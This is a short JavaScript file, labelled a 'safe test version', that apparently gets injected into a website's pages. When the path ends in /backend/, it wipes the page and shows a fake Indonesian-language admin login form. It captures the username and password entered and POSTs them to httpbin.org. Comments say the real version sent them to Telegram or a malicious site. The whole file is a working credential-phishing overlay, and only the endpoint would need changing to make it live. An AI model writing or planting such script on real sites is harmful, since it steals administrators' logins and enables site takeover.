// kode.js (safe test version)

// Run only if URL ends with /backend/
if (window.location.pathname.endsWith('/backend/')) {
  
  // Clear page content
  document.documentElement.innerHTML = "";

  // Create a container for our fake page
  const container = document.createElement('div');
  container.innerHTML = `
    <div class="container-xxl" style="font-family: Arial; background:#545250; min-height:100vh; padding:20px; color:white;">
      <div style="max-width:400px; margin:auto; background:#333; padding:20px; border-radius:10px;">
        <h2 style="text-align:center;">INFINIX2ND - Admin Login</h2>
        <p style="text-align:center;">Silakan masukan username dan password untuk login ke panel admin!</p>
        
        <form id="fakeLoginForm">
          <label>Username</label>
          <input type="text" name="user" placeholder="Enter your username" required style="width:100%; padding:8px; margin-bottom:10px;">

          <label>Password</label>
          <input type="password" name="pass" placeholder="Enter your password" required style="width:100%; padding:8px; margin-bottom:10px;">
          
          <label>Captcha</label>
          <input type="text" placeholder="Captcha code" required style="width:100%; padding:8px; margin-bottom:10px;">
          
          <button type="submit" style="width:100%; padding:10px; background:#007bff; border:none; color:white;">MASUK</button>
        </form>
      </div>
    </div>
  `;

  document.body.appendChild(container);

  // Capture form submit
  document.getElementById('fakeLoginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const username = this.user.value;
    const password = this.pass.value;

    // Instead of sending to Telegram or malicious site, log safely
    console.log("Captured credentials (test only):", { username, password });

    // Simulate sending to harmless endpoint
    fetch("https://httpbin.org/post", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, password, note: "Test environment only" })
    })
    .then(res => res.json())
    .then(data => console.log("Data sent to test endpoint:", data))
    .catch(err => console.error("Test send failed:", err));

    alert("Form submitted (test mode). Check console for captured values.");
  });

}
